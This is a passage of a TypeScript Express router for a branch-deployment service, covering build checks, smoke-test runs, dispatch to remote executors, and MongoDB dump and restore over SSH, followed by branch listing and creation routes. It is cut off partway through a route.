import http from 'node:http';
import https from 'node:https';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execSync, spawn } from 'node:child_process';
import { createGzip } from 'node:zlib';
import { Router, type Request } from 'express';
import { StateService } from '../services/state.js';
import { WorktreeService } from '../services/worktree.js';
import { resolveEffectiveProfile } from '../services/container.js';
import type { ContainerService } from '../services/container.js';
import type { SchedulerService } from '../services/scheduler.js';
import type { ExecutorRegistry } from '../scheduler/executor-registry.js';
import type { BranchEntry, CdsConfig, IShellExecutor, OperationLog, OperationLogEvent, BuildProfile, RoutingRule, ServiceState, InfraService, DataMigration, MongoConnectionConfig, CdsPeer, ExecutorNode } from '../types.js';
import { discoverComposeFiles, parseComposeFile, parseComposeString, toComposeYaml, parseCdsCompose, toCdsCompose } from '../services/compose-parser.js';
import type { ComposeServiceDef } from '../services/compose-parser.js';
import { combinedOutput } from '../types.js';
import { topoSortLayers } from '../services/topo-sort.js';
import { detectStack } from '../services/stack-detector.js';
import { assertProjectAccess } from './projects.js';
import { CheckRunRunner } from '../services/check-run-runner.js';
import { GitHubAppClient } from '../services/github-app-client.js';
import { isSafeGitRef } from '../services/github-webhook-dispatcher.js';

/**
 * P4 Part 18 (hardening): pre-restart sanity check for self-update.
 *
 * Runs `pnpm install --frozen-lockfile` + `tsc --noEmit` inside the
 * CDS source dir BEFORE kill+spawn. Returns a structured result
 * that the self-update route uses to decide whether to proceed.
 *
 * Contract:
 *   - ok: true  → both stages succeeded, safe to restart
 *   - ok: false → first failing stage + stderr excerpt in error
 *
 * Why this is in its own function: it's called from two routes
 * (the real /self-update and the dry-run /self-update-dry-run).
 * Both share the exact same validation so an operator who pre-
 * validates gets the same result the live restart would.
 *
 * Timeouts:
 *   pnpm install — 300s (cold install can take a while on slow disks)
 *   tsc          — 120s (CDS is ~5k LOC, should finish in <10s)
 *
 * On a healthy CDS these run in 3-8 seconds combined because
 * frozen-lockfile is a near no-op when node_modules is current.
 */
export async function validateBuildReadiness(
  shell: IShellExecutor,
  cdsDir: string,
): Promise<{ ok: true; summary: string } | { ok: false; stage: 'install' | 'tsc'; error: string }> {
  // Stage 1: pnpm install --frozen-lockfile
  const installResult = await shell.exec(
    'pnpm install --frozen-lockfile',
    { cwd: cdsDir, timeout: 300_000 },
  );
  if (installResult.exitCode !== 0) {
    const err = (combinedOutput(installResult) || 'pnpm install 失败').slice(0, 500);
    return { ok: false, stage: 'install', error: err };
  }

  // Stage 2: tsc --noEmit — catches ESM/CJS mismatches, missing
  // imports, type errors, and anything else that would crash the
  // new process at module-load time.
  const tscResult = await shell.exec(
    'npx tsc --noEmit',
    { cwd: cdsDir, timeout: 120_000 },
  );
  if (tscResult.exitCode !== 0) {
    const err = (combinedOutput(tscResult) || 'tsc --noEmit 失败').slice(0, 800);
    return { ok: false, stage: 'tsc', error: err };
  }

  return {
    ok: true,
    summary: 'pnpm install + tsc --noEmit 通过',
  };
}

/**
 * Result of a single smoke-all.sh run — surface area shared between the
 * manual `/api/branches/:id/smoke` endpoint (Phase 3) and the auto-hook
 * triggered after a successful `/deploy` when `project.autoSmokeEnabled`
 * is true (Phase 4).
 */
export interface SmokeRunResult {
  exitCode: number | null;
  elapsedSec: number;
  passedCount: number;
  failedCount: number;
}

export interface SmokeRunOptions {
  branch: BranchEntry;
  previewHost: string;        // e.g. "https://my-branch.miduo.org"
  accessKey: string;           // resolved AI_ACCESS_KEY
  impersonateUser?: string;    // default 'admin'
  skip?: string;               // comma-separated smoke keys to skip
  failFast?: boolean;
  scriptDir: string;           // dir containing smoke-all.sh
  /** Per-line callback; receives the raw stdout/stderr line. */
  onLine?: (stream: 'stdout' | 'stderr', line: string) => void;
  /** Fires when the bash process exits or errors before exit. */
  onComplete?: (result: SmokeRunResult) => void;
  /** Fires when spawn itself fails (ENOENT, EACCES, etc). */
  onError?: (err: Error) => void;
}

/**
 * Spawn scripts/smoke-all.sh as a child process and fan out its output
 * via callbacks. Callers own the IO side (SSE, check-run update, etc.);
 * this helper just wraps the child-process bookkeeping + pass/fail
 * tally extraction so we don't copy-paste 60 lines of spawn boilerplate.
 *
 * Does NOT validate inputs — callers must have verified that smoke-all.sh
 * exists, that the branch has a preview URL, and that accessKey is
 * non-empty. This is a pure execution helper; validation belongs at the
 * HTTP boundary.
 */
export function runSmokeForBranch(opts: SmokeRunOptions): void {
  const smokeEntry = path.join(opts.scriptDir, 'smoke-all.sh');
  const child = spawn('bash', [smokeEntry], {
    cwd: opts.scriptDir,
    env: {
      ...process.env,
      SMOKE_TEST_HOST: opts.previewHost,
      AI_ACCESS_KEY: opts.accessKey,
      SMOKE_USER: opts.impersonateUser || 'admin',
      SMOKE_SKIP: opts.skip || '',
      SMOKE_FAIL_FAST: opts.failFast ? '1' : '',
    },
  });
  const startedAt = Date.now();
  let passed = 0;
  let failed = 0;

  const forward = (stream: NodeJS.ReadableStream, channel: 'stdout' | 'stderr') => {
    let buffer = '';
    stream.on('data', (chunk: Buffer) => {
      buffer += chunk.toString('utf8');
      let idx: number;
      while ((idx = buffer.indexOf('\n')) >= 0) {
        const line = buffer.slice(0, idx);
        buffer = buffer.slice(idx + 1);
        // Tally from the "✅ 通过: N 项" / "❌ 失败: N 项" footer lines
        // printed by smoke-all.sh. Not rely on exit code alone — the
        // footer is what CI / UI surface.
        if (line.startsWith('✅ 通过:') || line.startsWith('\u2705 通过:')) {
          const m = /通过:\s*(\d+)/.exec(line);
          if (m) passed = parseInt(m[1], 10);
        } else if (line.startsWith('❌ 失败:') || line.startsWith('\u274c 失败:')) {
          const m = /失败:\s*(\d+)/.exec(line);
          if (m) failed = parseInt(m[1], 10);
        }
        opts.onLine?.(channel, line);
      }
    });
  };
  forward(child.stdout!, 'stdout');
  forward(child.stderr!, 'stderr');

  child.on('error', (err) => {
    opts.onError?.(err);
  });

  child.on('close', (code) => {
    opts.onComplete?.({
      exitCode: code,
      elapsedSec: Math.round((Date.now() - startedAt) / 1000),
      passedCount: passed,
      failedCount: failed,
    });
  });
}

/**
 * Locate the smoke-all.sh script. Shared between the manual endpoint
 * and the auto-hook. Returns null when the script is missing so the
 * caller can decide between 500 error (manual endpoint) or warning
 * SSE line (auto-hook, best-effort).
 */
export function resolveSmokeScriptDir(): { dir: string; entry: string; exists: boolean } {
  const dir = process.env.CDS_SMOKE_SCRIPT_DIR
    || path.join(process.cwd(), 'scripts');
  const entry = path.join(dir, 'smoke-all.sh');
  return { dir, entry, exists: fs.existsSync(entry) };
}

export interface RouterDeps {
  stateService: StateService;
  worktreeService: WorktreeService;
  containerService: ContainerService;
  shell: IShellExecutor;
  config: CdsConfig;
  /** Optional warm-pool scheduler (v3.1). When absent, scheduler API returns disabled. */
  schedulerService?: SchedulerService;
  /**
   * Cluster executor registry (scheduler/standalone mode). When absent or
   * containing only an embedded master, deploys run locally. When a remote
   * executor is registered and the request either targets it explicitly or
   * lets the dispatcher pick, the deploy is proxied to the remote executor's
   * `/exec/deploy` HTTP SSE endpoint.
   */
  registry?: ExecutorRegistry;
  /**
   * Current scheduling strategy, read fresh on every dispatch so the
   * Dashboard's strategy radio takes effect immediately without restart.
   * Defaults to `least-load` if not provided.
   */
  getClusterStrategy?: () => 'least-branches' | 'least-load' | 'round-robin';
  /**
   * Optional GitHubAppClient — when provided, deploys post "CDS Deploy"
   * check runs back to GitHub so the PR's Checks panel mirrors CDS's
   * build status. Absent when CDS_GITHUB_APP_* env vars aren't set.
   */
  githubApp?: GitHubAppClient;
}

export function createBranchRouter(deps: RouterDeps): Router {
  const {
    stateService,
    worktreeService,
    containerService,
    shell,
    config,
    schedulerService,
    registry,
    getClusterStrategy,
    githubApp,
  } = deps;

  const router = Router();

  const checkRunRunner = new CheckRunRunner({
    stateService,
    githubApp,
    config,
  });

  // ── Cluster dispatch helper ──
  //
  // Given an incoming deploy request, decide whether it should run locally on
  // this master (returns null) or proxied to a remote executor (returns the
  // executor node). The decision order:
  //
  //   1. Request body `targetExecutorId` — explicit user choice. Must exist
  //      and be online; if missing or offline we fall back to (3).
  //   2. Branch's sticky `entry.executorId` — if this branch was previously
  //      deployed to a specific executor and that executor is still online,
  //      keep it there (deploys are idempotent on target).
  //   3. Registry's `selectExecutor(strategy)` — pick the least-loaded online
  //      executor. If the pick is the embedded master itself, return null so
  //      the existing local code path runs.
  //   4. No registry at all (standalone mode, no cluster) — return null.
  //
  // Returning null means "run locally, unchanged from before cluster".
  // Returning an ExecutorNode means "dispatch this deploy via HTTP proxy".
  function resolveDeployTarget(
    entry: BranchEntry,
    explicitTargetId: string | undefined,
  ): ExecutorNode | null {
    if (!registry) return null;

    // Explicit target wins if valid.
    if (explicitTargetId) {
      const picked = registry.getAll().find(n => n.id === explicitTargetId);
      if (picked && picked.status === 'online') {
        return picked.role === 'embedded' ? null : picked;
      }
      // Explicit but invalid → fall through to auto
    }

    // Sticky: respect previous placement if still viable.
    if (entry.executorId) {
      const sticky = registry.getAll().find(n => n.id === entry.executorId);
      if (sticky && sticky.status === 'online') {
        return sticky.role === 'embedded' ? null : sticky;
      }
      // Previously-owned executor is gone → let dispatcher re-pick
    }

    // Auto-pick via the configured strategy.
    const online = registry.getOnline();
    const remoteOnline = online.filter(n => n.role !== 'embedded');
    if (remoteOnline.length === 0) {
      // No remote executors available — run locally.
      return null;
    }
    // Use the current Dashboard strategy, defaulting to least-load which
    // is the most real-world useful (weighted memory + CPU).
    const strategy = getClusterStrategy?.() || 'least-load';
    const picked = registry.selectExecutor(strategy);
    if (!picked || picked.role === 'embedded') return null;
    return picked;
  }

  /**
   * Proxy a deploy request to a remote executor's `/exec/deploy` endpoint.
   * Streams the executor's SSE response back to the client verbatim, so the
   * dashboard's transit page and log box render exactly the same experience
   * as a local deploy. Updates the master's state so the branch shows up as
   * "hosted on" the target executor.
   *
   * Design notes:
   *  - We use global `fetch` (Node 18+) with a streaming body reader. The
   *    readable stream's chunks are raw SSE bytes; we forward them untouched
   *    so step/log/complete/error events all flow through.
   *  - We set `entry.executorId` BEFORE making the remote call so concurrent
   *    status reads see the correct ownership. If the remote call fails we
   *    leave executorId set — next deploy attempt will hit the same executor
   *    (sticky) or fall through to re-selection if it's offline.
   *  - Auth: the master sends its `X-Executor-Token` so the remote's
   *    `/exec` middleware accepts the call. This token is the shared cluster
   *    secret minted during bootstrap.
   */
  async function proxyDeployToExecutor(
    executor: ExecutorNode,
    entry: BranchEntry,
    res: import('express').Response,
  ): Promise<void> {
    // SSE headers on client side — same shape the local deploy uses so the
    // frontend doesn't need to know whether it's local or remote.
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
      'X-Accel-Buffering': 'no',
    });

    // Record the ownership eagerly so GET /api/branches reflects the new
    // placement even before deploy finishes. If something goes wrong, the
    // next retry will still target this executor (sticky).
    entry.executorId = executor.id;
    entry.status = 'building';
    stateService.save();

    // Tell the client we're proxying — gives the transit page a nice hint
    // and makes the log box show meaningful context on the very first event.
    const preamble = {
      step: 'dispatch',
      status: 'running',
      title: `派发到执行器 ${executor.id} (${executor.host}:${executor.port})`,
      timestamp: new Date().toISOString(),
    };
    res.write(`event: step\ndata: ${JSON.stringify(preamble)}\n\n`);

    // Prepare the payload the remote's /exec/deploy expects. The remote has
    // its own worktree + state, so we pass branch metadata + profiles + the
    // merged env var map and let it handle the rest.
    // P4 Part 17 (G2 fix): scope by the branch's project so a remote
    // executor only receives profiles owned by this project.
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');
    const cdsEnv = stateService.getCdsEnvVars();
    // Per-project scope: _global baseline + project override wins.
    const customEnv = stateService.getCustomEnv(entry.projectId || 'default');
    const mirrorEnv = stateService.getMirrorEnvVars();
    const env = { ...cdsEnv, ...mirrorEnv, ...customEnv };

    const payload = {
      branchId: entry.id,
      branchName: entry.branch,
      profiles,
      env,
    };

    const upstreamUrl = `http://${executor.host}:${executor.port}/exec/deploy`;
    try {
      const upstream = await fetch(upstreamUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
        },
        body: JSON.stringify(payload),
      });

      if (!upstream.ok || !upstream.body) {
        const errText = await (upstream.text ? upstream.text() : Promise.resolve('(no body)'));
        const errEvent = {
          message: `执行器拒绝部署请求 (HTTP ${upstream.status}): ${errText.slice(0, 200)}`,
        };
        res.write(`event: error\ndata: ${JSON.stringify(errEvent)}\n\n`);
        entry.status = 'error';
        entry.errorMessage = errEvent.message;
        stateService.save();
        return;
      }

      // Pipe the executor's SSE bytes directly to the client. Chunks may
      // contain partial events but SSE framing is newline-delimited so the
      // browser's EventSource parser handles boundaries correctly.
      const reader = upstream.body.getReader();
      const decoder = new TextDecoder('utf-8');
      let buffer = '';
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        const chunk = decoder.decode(value, { stream: true });
        buffer += chunk;
        // Flush every complete SSE frame (terminated by blank line) so the
        // client sees updates promptly rather than waiting for the full
        // upstream response to arrive.
        try {
          res.write(chunk);
        } catch {
          // Client disconnected mid-stream — stop piping; the remote will
          // continue its build independently of this pipe going away.
          break;
        }
      }
      // If the upstream ended mid-event (rare), drain the final bytes.
      if (buffer.length > 0) {
        try { res.write(decoder.decode()); } catch { /* client gone */ }
      }

      // Master-side state is best-effort — the executor has the source of
      // truth via its next heartbeat, which will reconcile status.
      entry.lastAccessedAt = new Date().toISOString();
      stateService.save();
    } catch (err) {
      const msg = (err as Error).message;
      const errEvent = { message: `派发到执行器失败: ${msg}` };
      try { res.write(`event: error\ndata: ${JSON.stringify(errEvent)}\n\n`); } catch { /* ignore */ }
      entry.status = 'error';
      entry.errorMessage = errEvent.message;
      stateService.save();
    } finally {
      try { res.end(); } catch { /* ignore */ }
    }
  }

  // ── Preview port servers (port mode: per-branch proxy with path-prefix routing) ──
  const previewServers = new Map<string, http.Server>();

  function cleanupPreviewServer(branchId: string) {
    const server = previewServers.get(branchId);
    if (server) {
      server.close();
      previewServers.delete(branchId);
      const entry = stateService.getBranch(branchId);
      if (entry) {
        delete entry.previewPort;
        stateService.save();
      }
      console.log(`[preview] Closed preview proxy for "${branchId}"`);
    }
  }

  // ── Helper: merged env (CDS_* auto vars + customEnv, later wins) ──
  //
  // When `projectId` is supplied, two extra project-scoped vars get
  // injected BEFORE customEnv so compose YAMLs can template against
  // them (e.g. `MongoDB__DatabaseName: "prdagent-${CDS_PROJECT_SLUG}"`
  // gives each project its own database without shared-mongo risks):
  //
  //   CDS_PROJECT_ID   — opaque project id (e.g. "50bf3eac3d02")
  //   CDS_PROJECT_SLUG — URL-friendly slug ("prd-agent-2"); for legacy
  //                      default project this is the repoRoot basename,
  //                      preserving existing behaviour.
  //
  // customEnv always wins so an operator can override the slug-based
  // default from the Dashboard if needed.
  function getMergedEnv(projectId?: string): Record<string, string> {
    const cdsEnv = stateService.getCdsEnvVars();   // CDS_HOST, CDS_MONGODB_PORT, etc.
    const mirrorEnv = stateService.getMirrorEnvVars(); // npm/corepack mirror (if enabled)
    // Scoped custom env: _global when no projectId, else { _global..., <projectId>... }
    const customEnv = stateService.getCustomEnv(projectId);
    const projectEnv: Record<string, string> = {};
    if (projectId) {
      const project = stateService.getProject(projectId);
      if (project) {
        projectEnv.CDS_PROJECT_ID = project.id;
        projectEnv.CDS_PROJECT_SLUG = project.slug;
      }
    }
    return { ...cdsEnv, ...mirrorEnv, ...projectEnv, ...customEnv };
  }

  /** Mask sensitive env var values for trace logging */
  function maskSecrets(env: Record<string, string>): Record<string, string> {
    const SENSITIVE = /secret|password|token|key|credential/i;
    const masked: Record<string, string> = {};
    for (const [k, v] of Object.entries(env)) {
      masked[k] = SENSITIVE.test(k) ? '***' : v;
    }
    return masked;
  }

  // ── Helper: SSE setup ──
  function initSSE(res: import('express').Response) {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
      'X-Accel-Buffering': 'no',
    });
  }

  function sendSSE(res: import('express').Response, event: string, data: unknown) {
    try {
      res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
    } catch { /* client disconnected */ }
  }

  /**
   * Phase 4: optionally run scripts/smoke-all.sh after a successful
   * deploy, piggy-backing SSE events on the deploy stream as
   * `smoke-start` / `smoke-line` / `smoke-complete`. Returns the
   * result so the caller can fold it into the GitHub check-run
   * conclusion (Phase 5).
   *
   * All failure paths emit exactly one `smoke-skip` line and resolve
   * with null so the deploy flow keeps going. This is intentionally
   * best-effort — smoke is diagnostic, not a gate.
   */
  async function maybeRunAutoSmoke(
    res: import('express').Response,
    entry: BranchEntry,
    deployFailed: boolean,
  ): Promise<SmokeRunResult | null> {
    if (deployFailed) return null;
    const project = stateService.getProject(entry.projectId || 'default');
    if (!project?.autoSmokeEnabled) return null;

    const emitSkip = (reason: string) => {
      try {
        res.write(`event: smoke-skip\ndata: ${JSON.stringify({ reason })}\n\n`);
      } catch { /* client gone */ }
    };

    const previewHost = config.previewDomain || config.rootDomains?.[0];
    if (!previewHost) {
      emitSkip('preview_host_missing');
      return null;
    }
    const smokeHost = `https://${entry.id}.${previewHost}`;

    const globalEnv = stateService.getCustomEnv('_global');
    const accessKey = (globalEnv?.AI_ACCESS_KEY || '').trim();
    if (!accessKey) {
      emitSkip('access_key_missing');
      return null;
    }

    const script = resolveSmokeScriptDir();
    if (!script.exists) {
      emitSkip('smoke_script_missing');
      return null;
    }

    sendSSE(res, 'smoke-start', { host: smokeHost, branchId: entry.id });

    return new Promise<SmokeRunResult | null>((resolve) => {
      runSmokeForBranch({
        branch: entry,
        previewHost: smokeHost,
        accessKey,
        scriptDir: script.dir,
        failFast: true, // CI-style — first failure stops the chain
        onLine: (channel, text) => sendSSE(res, 'smoke-line', { stream: channel, text }),
        onError: (err) => {
          sendSSE(res, 'smoke-line', { stream: 'stderr', text: `[auto-smoke] ${err.message}` });
          sendSSE(res, 'smoke-complete', { exitCode: -1, elapsedSec: 0, passedCount: 0, failedCount: 0, error: err.message });
          resolve(null);
        },
        onComplete: (result) => {
          sendSSE(res, 'smoke-complete', result);
          resolve(result);
        },
      });
    });
  }

  /**
   * Compute current container capacity status.
   * Returns `current / max` — when `current >= max` the host is considered
   * over-subscribed and the caller should warn (or, with scheduler enabled,
   * trigger LRU eviction before spawning new containers).
   *
   * Duplicates the logic in `GET /branches` so deploy-time decisions don't
   * depend on the client having fetched capacity first.
   * See doc/design.cds-resilience.md §四.1.
   */
  function computeCapacity(): { current: number; max: number; totalMemGB: number } {
    const totalMemGB = Math.round(os.totalmem() / (1024 * 1024 * 1024));
    const max = Math.max(2, (totalMemGB - 1) * 2);
    let current = 0;
    for (const b of stateService.getAllBranches()) {
      for (const svc of Object.values(b.services)) {
        if (svc.status === 'running' || svc.status === 'building' || svc.status === 'starting') {
          current++;
        }
      }
    }
    return { current, max, totalMemGB };
  }

  /** Write deploy event to stdout (captured by cds.log when running in background) */
  function logDeploy(branchId: string, message: string) {
    const ts = new Date().toISOString().slice(11, 19);
    console.log(`  [deploy:${branchId}] ${ts} ${message}`);
  }

  /** Download MongoDB database tools binary (platform-independent fallback) */
  async function installMongoToolsBinary(sh: IShellExecutor, send: (msg: string) => void) {
    const archResult = await sh.exec('uname -m');
    const arch = archResult.stdout.trim();
    const isArm = arch === 'aarch64' || arch === 'arm64';
    const platform = isArm ? 'arm64' : 'x86_64';
    const url = `https://fastdl.mongodb.org/tools/db/mongodb-database-tools-debian12-${platform}-100.10.0.deb`;
    send(`正在下载 MongoDB 工具 (${platform})...`);
    // Try dpkg if debian-based, otherwise extract manually
    const dlResult = await sh.exec(
      `cd /tmp && curl -fsSL -o mongo-tools.deb "${url}" 2>&1 && dpkg -x mongo-tools.deb /tmp/mongo-tools-extracted 2>&1 && cp /tmp/mongo-tools-extracted/usr/bin/mongo* /usr/local/bin/ 2>&1 && chmod +x /usr/local/bin/mongo* && rm -rf /tmp/mongo-tools.deb /tmp/mongo-tools-extracted`,
      { timeout: 120000 }
    );
    if (dlResult.exitCode !== 0) {
      // Try tarball as absolute fallback
      send('deb 安装失败，尝试 tarball...');
      const tgzUrl = `https://fastdl.mongodb.org/tools/db/mongodb-database-tools-linux-${platform}-100.10.0.tgz`;
      await sh.exec(
        `cd /tmp && curl -fsSL -o mongo-tools.tgz "${tgzUrl}" && tar xzf mongo-tools.tgz && cp mongodb-database-tools-*/bin/mongo* /usr/local/bin/ && chmod +x /usr/local/bin/mongo* && rm -rf /tmp/mongo-tools.tgz /tmp/mongodb-database-tools-*`,
        { timeout: 120000 }
      );
    }
    send('MongoDB 工具已安装');
  }

  // ─────────────────────────────────────────────────────────────────
  //   Migration pipeline helpers (shared by /execute, local-dump, local-restore)
  // ─────────────────────────────────────────────────────────────────

  /**
   * Build the mongodump argument list for a resolved connection.
   * Always uses `--archive --gzip` so the output is a single streamable blob.
   */
  function buildMongodumpArgs(
    host: string,
    port: number,
    auth: { username?: string; password?: string; authDatabase?: string },
    database: string | undefined,
    collections: string[] | undefined,
  ): string[] {
    const args: string[] = ['--host', host, '--port', String(port), '--archive', '--gzip'];
    if (auth.username) args.push('--username', auth.username);
    if (auth.password) args.push('--password', auth.password);
    if (auth.authDatabase) args.push('--authenticationDatabase', auth.authDatabase);
    if (database) args.push('--db', database);
    if (collections && collections.length === 1) {
      // mongodump only supports --collection when --db is set + single collection
      args.push('--collection', collections[0]);
    }
    // For multi-collection migrations, dump the whole db and let --nsInclude filter on restore
    return args;
  }

  function buildMongorestoreArgs(
    host: string,
    port: number,
    auth: { username?: string; password?: string; authDatabase?: string },
    opts: { drop: boolean; sourceDb?: string; targetDb?: string; collections?: string[] },
  ): string[] {
    const args: string[] = ['--host', host, '--port', String(port), '--archive', '--gzip'];
    if (auth.username) args.push('--username', auth.username);
    if (auth.password) args.push('--password', auth.password);
    if (auth.authDatabase) args.push('--authenticationDatabase', auth.authDatabase);
    if (opts.drop) args.push('--drop');
    // Cross-database rename: --nsFrom="srcDb.*" --nsTo="tgtDb.*"
    if (opts.sourceDb && opts.targetDb && opts.sourceDb !== opts.targetDb) {
      args.push('--nsFrom', `${opts.sourceDb}.*`, '--nsTo', `${opts.targetDb}.*`);
    }
    if (opts.sourceDb && opts.collections && opts.collections.length > 0) {
      // Filter to only these collections
      for (const col of opts.collections) {
        args.push('--nsInclude', `${opts.sourceDb}.${col}`);
      }
    }
    return args;
  }

  /**
   * Parse a line of mongodump/mongorestore progress output and return a
   * human-readable one-liner, or null if the line carries no useful signal.
   *
   * Example inputs:
   *   "2026-04-10T23:41:12.419+0200 [####........] prdagent.users 500/4105 (12.2%)"
   *   "2026-04-10T23:41:10.660+0200 writing prdagent.users to /dev/stdout"
   *   "2026-04-10T23:41:30.660+0200 done dumping prdagent.users (4105 documents)"
   */
  function parseMongoProgressLine(line: string): string | null {
    const trimmed = line.trim();
    if (!trimmed) return null;
    // Progress bar line: "[####....] db.col 500/4105 (12.2%)"
    const bar = trimmed.match(/\]\s+([^\s]+)\s+(\d+)\/(\d+)\s+\(([\d.]+)%\)/);
    if (bar) return `${bar[1]} ${bar[4]}%  (${bar[2]}/${bar[3]})`;
    // "writing db.col to ..."
    const writing = trimmed.match(/writing\s+([^\s]+)\s+to/);
    if (writing) return `写入 ${writing[1]}...`;
    // "done dumping db.col (N documents)"
    const doneDump = trimmed.match(/done dumping\s+([^\s]+)\s+\((\d+)\s+documents?\)/);
    if (doneDump) return `✓ 导出 ${doneDump[1]} (${doneDump[2]})`;
    // "finished restoring db.col (N documents, 0 failures)"
    const doneRestore = trimmed.match(/finished restoring\s+([^\s]+)\s+\((\d+)\s+documents?/);
    if (doneRestore) return `✓ 导入 ${doneRestore[1]} (${doneRestore[2]})`;
    // "preparing collections to restore from"
    if (trimmed.includes('preparing collections')) return '准备还原集合...';
    // Error-ish lines
    if (/error|failed|fatal/i.test(trimmed)) return trimmed.slice(0, 200);
    return null;
  }

  /**
   * Build the SSH command prefix used to run mongodump/mongorestore on a
   * remote jump host. The resulting array starts with 'ssh' and ends with
   * the username@host argument, ready to be appended with the remote shell
   * command as the last argv item.
   */
  function buildSshBase(tunnel: NonNullable<MongoConnectionConfig['sshTunnel']>): string[] {
    const args = [
      '-o', 'BatchMode=yes',
      '-o', 'StrictHostKeyChecking=no',
      '-o', 'UserKnownHostsFile=/dev/null',
      '-o', 'ConnectTimeout=10',
      // Keepalive: critical for long dumps — send a probe every 30s, tolerate 10 misses.
      '-o', 'ServerAliveInterval=30',
      '-o', 'ServerAliveCountMax=10',
      '-o', 'TCPKeepAlive=yes',
      '-p', String(tunnel.port || 22),
    ];
    if (tunnel.privateKeyPath) args.unshift('-i', tunnel.privateKeyPath);
    args.push(`${tunnel.username}@${tunnel.host}`);
    return args;
  }

  /**
   * Shell-quote a single argument (single-quote style, safe for POSIX sh).
   */
  function shq(s: string): string {
    return `'${String(s).replace(/'/g, `'"'"'`)}'`;
  }

  /**
   * Build the remote command string for mongodump/mongorestore over SSH,
   * optionally wrapped in `docker exec <container> sh -c ...`.
   */
  function buildRemoteMongoCmd(
    tool: 'mongodump' | 'mongorestore',
    args: string[],
    dockerContainer: string | undefined,
  ): string {
    const inner = [tool, ...args.map(shq)].join(' ');
    if (dockerContainer) {
      // docker exec -i for restore (stdin), no -i for dump
      const flags = tool === 'mongorestore' ? '-i' : '';
      return `docker exec ${flags} ${shq(dockerContainer)} sh -c ${shq(inner)}`.replace(/  +/g, ' ');
    }
    return inner;
  }

  // ── Remote branches ──

  router.get('/remote-branches', async (_req, res) => {
    try {
      await shell.exec(
        'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
        { cwd: config.repoRoot, timeout: 30_000 },
      );

      const SEP = '<SEP>';
      const format = [
        '%(refname:lstrip=3)', '%(committerdate:iso8601)',
        '%(authorname)', '%(subject)',
      ].join(SEP);

      const result = await shell.exec(
        `git for-each-ref --sort=-committerdate --format="${format}" refs/remotes/origin`,
        { cwd: config.repoRoot },
      );

      const branches = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => {
          const [name, date, author, subject] = line.split(SEP);
          return { name, date, author, subject };
        })
        .filter(b => b.name !== 'HEAD');

      res.json({ branches });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Branches CRUD ──

  router.get('/branches', async (req, res) => {
    const state = stateService.getState();
    // P4 Part 3b: optional ?project=<id> filter. When absent or set to
    // 'default', pre-P4 behavior is preserved (every branch rolls up
    // because all legacy branches were migrated to projectId='default'
    // in migrateProjectScoping).
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const branches = Object.values(state.branches).filter(
      (b) => !projectFilter || (b.projectId || 'default') === projectFilter,
    );

    // Reconcile container status
    for (const b of branches) {
      for (const [profileId, svc] of Object.entries(b.services)) {
        if (svc.status === 'running') {
          const running = await containerService.isRunning(svc.containerName);
          if (!running) {
            svc.status = 'stopped';
            b.services[profileId] = svc;
          }
        }
      }
      // Update overall status
      const statuses = Object.values(b.services).map(s => s.status);
      if (statuses.some(s => s === 'running')) b.status = 'running';
      else if (statuses.some(s => s === 'building')) b.status = 'building';
      else if (statuses.some(s => s === 'error')) b.status = 'error';
      else b.status = 'idle';
    }
    stateService.save();

    // Fetch latest commit subject + short SHA for each branch
    const branchesWithSubject = await Promise.all(
      branches.map(async (b) => {
        try {
          const result = await shell.exec(
            'git log -1 --format=%h%n%s',
            { cwd: b.worktreePath, timeout: 5000 },
          );
          const lines = result.stdout.trim().split('\n');
          return { ...b, commitSha: lines[0] || '', subject: lines[1] || '' };
        } catch {
          return { ...b, commitSha: '', subject: '' };
        }
      }),
    );

    // Sort: favorites first, then by creation date
    branchesWithSubject.sort((a, b) => {
      const fa = a.isFavorite ? 1 : 0;
      const fb = b.isFavorite ? 1 : 0;
      if (fa !== fb) return fb - fa;
      return 0; // preserve original order
    });

    // Compute container capacity: (memoryGB - 1) * 2
    const totalMemGB = Math.round(os.totalmem() / (1024 * 1024 * 1024));
    const maxContainers = Math.max(2, (totalMemGB - 1) * 2);
    let runningContainers = 0;
    for (const b of branches) {
      for (const svc of Object.values(b.services)) {
        if (svc.status === 'running' || svc.status === 'building' || svc.status === 'starting') {
          runningContainers++;
        }
      }
    }

    res.json({
      branches: branchesWithSubject,
      defaultBranch: state.defaultBranch,
      capacity: { maxContainers, runningContainers, totalMemGB },
      tabTitleEnabled: stateService.isTabTitleEnabled(),
    });
  });

  router.post('/branches', async (req, res) => {
    try {
      const { branch, projectId } = req.body as { branch?: string; projectId?: string };
      if (!branch) {
        res.status(400).json({ error: '分支名称不能为空' });
        return;
      }

      // P4 Part 3b: if the Dashboard passes projectId in the body, stamp
      // it on the new branch so project-scoped list queries can find it.
      // Missing value → defaults to 'default' in addBranch().
      const effectiveProjectId = projectId && typeof projectId === 'string' ? projectId : 'default';
      // Enforce: a project-scoped Agent Key may only touch its own project.
      const akMismatch = assertProjectAccess(req as any, effectiveProjectId);
      if (akMismatch) {
        res.status(akMismatch.status).json(akMismatch.body);
        return;
      }
      // Validate the project exists so we don't create orphans.
      const targetProject = stateService.getProject(effectiveProjectId);
      if (!targetProject) {
        res.status(400).json({ error: `未知项目: ${effectiveProjectId}` });
        return;
      }

      // Branch ID scoping: legacy default keeps the bare slugified name
      // for back-compat (existing URLs, saved links). Non-legacy
      // projects auto-prefix with the project slug so two projects can
      // each register "main" without colliding — this matches the
      // already-scoped worktree layout below. The preview domain still
      // resolves via `<branchId>.miduo.org`, no extra subdomain config.
      const slugified = StateService.slugify(branch);
      const id = targetProject.legacyFlag
        ? slugified
        : `${targetProject.slug}-${slugified}`;
      if (stateService.getBranch(id)) {
        res.status(409).json({ error: `分支 "${id}" 已存在` });
        return;
      }

